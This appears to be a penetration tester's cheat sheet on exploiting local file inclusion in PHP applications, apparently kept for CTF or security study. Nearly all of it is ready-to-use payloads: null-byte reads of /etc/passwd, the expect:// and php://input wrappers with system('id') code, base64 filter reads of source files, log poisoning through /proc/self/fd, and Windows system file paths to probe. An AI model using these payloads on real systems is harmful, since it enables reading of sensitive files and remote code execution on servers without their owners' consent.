# php wrappers, LFI

## Workarounds

`NOTE:` **`Read the file that is running LFI`**`to get more information about the code.`

```bash
# using null byte %00
/etc/passwd%00

# LFI wordlist
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt
```

## .php wrappers

```bash
# protocol wraper
file=http://IP/
file=ftp://IP/

# expect wrapper
# allows to run system commands
file=expect://id

# input wrapper
file=php://input
# needs to send POST data
<?php system('id'); ?> | <?php shell_exec('id'); ?>

# filter wrapper
file=php://filter/convert.base64-encode/resource=PHP-FILE
```

## LFI to RCE (linux)

```bash
# using LFI can read access log files and then log poision
# if user does not have perms to read log files; can do file descriptor way
LFI=/proc/self/fd/{NUMBER}

# once have access to log file > log-poisoning.
```

## LFI Paths (windows)

```bash
# sample paths to test
C:\Windows\System32\Drivers\etc\hosts
C:\\Windows\\System32\\Drivers\\etc\\hosts
\Windows\System32\Drivers\etc\hosts
\\Windows\\System32\\Drivers\\etc\\hosts
C:\Windows\win.ini
C:\\Windows\\win.ini
\Windows\win.ini
\\Windows\\win.ini
C:\Windows\system.ini
C:\\Windows\\system.ini
\Windows\system.ini
\\Windows\\system.ini
```
